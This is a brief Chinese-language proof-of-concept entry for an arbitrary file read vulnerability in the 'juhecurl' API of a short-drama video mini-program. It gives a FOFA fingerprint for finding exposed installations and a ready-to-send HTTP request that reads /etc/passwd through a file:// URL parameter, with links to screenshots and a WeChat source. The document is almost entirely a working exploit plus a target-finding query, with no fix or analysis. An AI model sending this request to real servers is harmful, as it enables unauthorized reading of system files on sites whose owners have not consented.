# 短剧影视小程序前台juhecurl任意文件读取漏洞



## fofa

```yaml
"/VwmRIfEYDH.php"
```

## poc

```javascript
GET /api/ems/juhecurl?url=file:///etc/passwd HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20240902102433044](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409021024146.png)

![image-20240902102440030](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409021024087.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/3WYJzQnjl8hP7oXVZUEQuA